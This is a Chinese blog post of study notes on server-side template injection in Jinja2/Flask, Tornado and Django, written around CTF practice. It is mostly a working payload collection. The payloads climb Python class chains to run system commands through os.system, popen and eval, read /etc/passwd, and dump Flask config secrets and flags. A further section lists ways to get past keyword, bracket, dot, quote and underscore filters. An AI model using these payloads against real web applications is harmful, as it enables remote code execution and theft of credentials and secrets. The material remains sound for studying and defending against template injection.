---
title: "SSTI学习笔记"
slug: "ssti-study-notes"
description: "系统的捋一下，顺顺思路"
date: 2021-11-08T20:59:28+08:00
categories: ["NOTES&SUMMARY"]
series: []
tags: ["SSTI", "Python"]
draft: false
toc: true
---

模板渲染可以借助代码构造（如条件、循环语句等）十分方便的动态呈现内容，但如果编写不当容易被攻击者注入恶意内容从而暴露上下文数据，甚至在服务器上运行执行任意命令的表达式

# Jinja

Jinja2是一种面向Python的现代和设计友好的模板语言，以Django的模板为模型，是Flask框架的一部分

Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用<u>过滤器</u>修改变量，过滤器名添加在变量名之后，中间使用竖线分隔（这很有利于我们构造恶意的payload），比如这样的模板可以用首字母大写形式显示变量name的值

```html
Hello, {{name|capitalize}}
```

Jinjia2也支持控制语句，比如这是一个常见的<u>for语句</u>的渲染情况

```html
<ul>
     {% for comment in comments %}
         <li>{{comment}}</li>
     {% endfor %}
</ul>
```

之所以有模板渲染的漏洞是因为在渲染传递进去的参数时模板可以直接访问Python的一些对象及方法，可以构造一个长长的继承链来执行一些操作，比如文件读写&命令执行

- `__dict__`：保存类实例或对象实例的属性变量键值对字典
- `__class__`：返回一个实例所属的类；python中的新式类（显示继承object对象的类）都有一个属性`__class`用于获取当前实例对应的类
- `__mro__`：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析（即MRO - Method Resolution Order）
- `__bases__`：以元组形式返回一个类直接所继承的类（可以理解为直接父类）
- `__base__`：返回一个类直接所继承的类（单个）（相当于`__bases__[0]`），和`__mro__`都是用来寻找基类的
- `__subclasses__`：以列表形式返回类的所有存活子类的引用（而非实例）；python中的类都继承自object，只要调用object类对象的`__subclasses__()`方法就可以获取想要的子类
- `__init__`：类的初始化方法
- `__globals__`：对包含函数全局变量的字典的引用，可以进一步获取file, os等模块
- `__builtin__`&&`__builtins__`：返回不用导入模块可以直接运行一些函数，例如int()，list()等内建函数，查看的方法是`dir(__builtins__)`　　
  - 在py2中`__builtins__`模块是解释器自动创建的对于`__builtin__`模块的引用，并非`__buitin__`本身（在主模块中时，情况类似我们创建一个变量并对它做一次引用传递，两者是一样的，指向相同；当不是主模块 而是我们创建的一个可以被导入的模块时，`__builtins__`其实是对`__builtin__.__dict__`模块的引用）
  - 在py3中`__builtin__`被命名为`builtins`
  - 参考：[深入理解Python中的`__builtin__`和`__builtins__`](https://blog.51cto.com/xpleaf/1764849)  |  [`__builtins__` 与 `__builtin__`（builtins）](https://zhuanlan.zhihu.com/p/125693125)

## 构造的原理

一言以蔽之：通过一个长长的调用继承链来将内建的函数或模块揪出来用

### step1 - 找到基类object

通过字符串、字典、列表、元组和很特殊的request来获取基类object，mro和bases[0]均可（或者是base 一样的效果，不一一列举）

![image-20211108104543559](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211108104543559.png)

```python
''.__class__.__mro__[2]	# py2
''.__class__.__mro__[1]	# py3
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]
```

### step2 - 获得“能用的”子类

```python
().__class__.__base__.__subclasses__()
```

会以列表形式返回object基类下的所有子类，我们需要的是其中含有`os`, `file`, `__builtins__`模块的子类；这里给出一个脚本，可以单独寻找特定子类，也可以根据想要的模块找到对应的子类，返回索引位置

```python
# py2 & py3
subclass = "warnings.WarningMessage"
module = '__builtins__'
raw = ().__class__.__base__.__subclasses__()

for index, value in enumerate(raw):
    if subclass in str(value):
        print('[*] %s - %s' % (str(value), index))
    try:
        if module in value.__init__.__globals__.keys():
            print(index, value)
    except:
        pass
```

![image-20211108115828170](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211108115828170.png)到这一步可以得到的

到这一步，我们的payload已经构造好一半了（以下index均指我们需要的subclass的索引位置）

```python
().__class__.__base__.__subclasses__()[index]
```

### step3 - 调用相关函数进行rce

#### py2 - file&os&linecache

`<type 'file'>`是py2的专属，直接可以用`read()`, `write()`, `readlines()`进行文件读写

```python
().__class__.__base__.__subclasses__()[40]('/etc/passwd').read()
().__class__.__base__.__subclasses__()[40]('/tmp').write('test')
```

`os`模块就不必说了，有`system()`可以直接rce的函数；在py2中这两个子类可以直接用

```python
# <class 'site._Printer'>, 71
# <class 'site.Quitter'>, 76
().__class__.__base__.__subclasses__()[index].__init__.__globals__['os'].system('whoami')
```

```python
{{().__class__.__base__.__subclasses__()[index].__init__.__globals__['os'].__dict__.environ['FLAG]}}
```

不嫌麻烦的还可以再套一层，用`linecache`来调用`os`，py2中有这两个类含有`linecache`模块

```python
# <class 'warnings.WarningMessage'>, 58
# <class 'warnings.catch_warnings', 59
[].__class__.__base__.__subclasses__()[index].__init__.__globals__['linecache'].__dict__['os'].__dict__['system']('whoami')
```

#### py3 - \_\_builtins\_\_

py3中就没这么直接，要关注的模块是`__builtins__`，借助它来调用内置的`open()`进行文件读写，用`eval()`将`os`模块引入rce

```python
().__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")
().__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['open']('/etc/passwd','r').read()
```

或者是直接用`__import__`加载`os`模块执行命令

```python
().__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()
```

py2有个特殊的`commands`模块也可以直接rce

```python
().__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('whoami')
```

——————注意引用`__builtins__`内建模块这一方式在py2&py3完全通杀

## 常用payload

其实上面已经列举的比较全啦，这里做一些小小的补充

### for语句确定索引位置

前面提到过一点，我们需要的子类在python不同版本中位置并不固定（主要是py3 py2的基本固定死了），针对这个问题可以用Jinja支持的for语句来解决，submodule的名字可以用上面的脚本跑

```html
{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='submodule' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```

```html
{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='submodule' %}{{c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
```

### 特殊的一些对象

```html
{{config}}
{{config.items()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

```html
{{get_flashed_messages.__globals__['current_app'].config}}
```

```html
{{app.__init__.__globals__.sys.modules.app.app.__dict__}}
```

```html
{{url_for.__globals__['__builtins__'].__import__('os').system('ls')}}
{{url_for.__globals__['current_app'].config.FLAG}}
```

```html
{{request.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}
```

## 各种各样的bypass

一般都不会只过滤一种的，综合应用

### 针对关键字的过滤

以class为例，做一个字符串的拼接

- ```python
  'cl'~'ass'	# 拼接
  "cl"+"ass"
  ```

- ```python
  'cla'.join('ss')	# 拼接
  ```

- ```python
  'Y2xhc3M='.decode('base64')	# b64
  ```

- ```python
  '\u0063\u006C\u0061\u0073\u0073'	# unicode
  ```

- ```python
  '\x63\x6c\x61\x73\x73'	# hex
  ```


### 过滤`[]`

`[]`用在字典按索引取值和数组中取值，不过禁止了还是有函数可以用

- `__getitem__`

  ```python
  ().__class__.__base__.__subclasses__().__getitem__(index).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__("os").popen("ls /").read()')
  ```

- `pop()`

  ```python
  ().__class__.__base__.__subclasses__().pop(index).__init__.__globals__.pop('__builtins__').pop('eval')('__import__("os").popen("ls /").read()')
  ```

- `.`

  ```python
  ().__class__.__bases__.0.__subclasses__().index.__init__.__globals__.linecache.os.popen('whoami').read()
  ```

### 过滤`.`

`.`点号用在向下不停地取值，跟`[]`很像

- ```python
  "".__class__ == ""["__class__"]
  ```

- `attr()` 很强的一个flask内置filter，`foo|attr("bar") == foo.bar`

  ```python
  {{()|attr('__class__')|attr('__base__')............}}
  ```

### 过滤`'`

- `chr` 先找出`chr()`的位置（注意跑脚本跑的是`__builtins__` 这个函数是内建的），用模板语句给它赋个值，然后调用

  ```html
  {% set chr=().__class__.__bases__[0].__subclasses__()[index].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
  ```

- `request.args` flask中存储请求参数及值的字典，可以将值先赋给它然后进行调用

  ```html
  {{[].__class__.__base__.__subclasses__()[index].__init__.__globals__[request.args.arg1]}}&arg1=os
  ```

### 过滤`_`

- `request.args`

  ```html
  {{''[request.args.class][request.args.base][request.args.subclasses]()[index]('/etc/passwd').read() }}&class=__class__&base=__base__&subclasses=__subclasses__
  ```

  这种方式可以结合get和post，举例->[[CTFshow 击剑杯]通关大佬](https://qgieod1s9b.feishu.cn/docs/doccnNEAk0zZJDhi7bypQhF6eFf#RYhszr)，在不同的字段处对传入参数的限制是不同的

  ```
  /edit?a=__init__&b=__globals__&c=__getitem__&d=os&e=popen&f=whoami&g=read
  POST: name={%25set%20r=request.args%25}&rank=1&speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&time=2021年11月11日
  ```

- 按字符串的方式走，也可

### 过滤`{`

- ```python
  {{}} == {% %}
  ```

### 过滤` `

- `+`替代

## 其它姿势

### 短短短

利用的是Flask中的`config`对象，它可以存储一部分设置项的内容；`config.update`方法可以用来存储设置项中的变量，用法是`config.update(key=value)`

这里用一个题做例子，指路->[[Digital Overdose 2021 Autumn CTF madlib]](https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/#webmadlib)

### ***pwn - 劫持got表getshell

pwn，在学了在学了，指新建文件夹和md文档😅

参考：[Python 沙箱逃逸](https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/)

# Tornado

Tornado也是一种模板，可以执行简单的表达式和传递变量，当参数可控时可能造成xss和rce

## 内置字典对象

- `handler.settings` 指向的是RequestHandler.application.settings

  ```html
  {{handler.settings}}
  {{escape(handler.settings["cookie"])}}
  ```

- 查看全局变量

  ```
  {{globals}}
  ```

## 执行代码

tornado支持三种ssti标签

```
{{xxx}}		可执行任意py代码和tornado内置对象
{%xxx%}		下面展开说
{#xxx#}		作为注释 内部语句不执行
```

`{%%}`中的语句收到限制，格式为`{%操作名 参数%}`，操作名有这些

```
apply、autoescape、block、comment、extends、for、from、if、import、include、module、raw、set、try、while、whitespace
```

其中的`raw`，可以执行原生py代码

```
{%raw eval('3-1')%}
```

`extends`可以接收文件路径作为参数来包含文件，如果该文件本身存在恶意的ssti payload，那将会被执行

（栗子可参见 [QWB2021 Quals]托纳多，结合了sql注入+sql文件写入

# Django

Django是一个python的web框架，相比flask比较庞大一点点；p牛的这篇文章->[Python 格式化字符串漏洞（Django为例）](https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html)指出了一种利用思路，通过Django默认的admin的model来获取settings对象，进而获取数据库账号密码、web加密密钥等信息

------

两周之前基本总结过了，但是前两天遇到要构造的具体场景还是打不穿，于是又捋了一遍利用的思路，把笔记整理出来了

这个故事告诉我们学东西要扎实，更扎实一点，不然会很蛋疼
